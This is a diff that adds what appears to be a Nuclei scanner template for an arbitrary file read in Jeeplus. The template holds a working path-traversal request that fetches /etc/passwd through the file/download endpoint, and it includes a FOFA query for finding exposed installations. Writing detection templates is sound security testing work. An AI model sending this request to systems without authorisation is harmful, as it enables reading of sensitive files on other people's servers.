@@ -1,0 +1,27 @@
+id: jeeplus-download-anyfileread
+
+info:
+  name: Jeeplus download - File Read
+  author: qwtd
+  severity: high
+  description: |
+    FOFA: app="Jeeplus"
+  tags: Jeeplus
+
+
+http:
+  - raw:
+      - |
+        GET /jeeplus-vue/file/download?uploadPath=../../../../etc/&name=passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
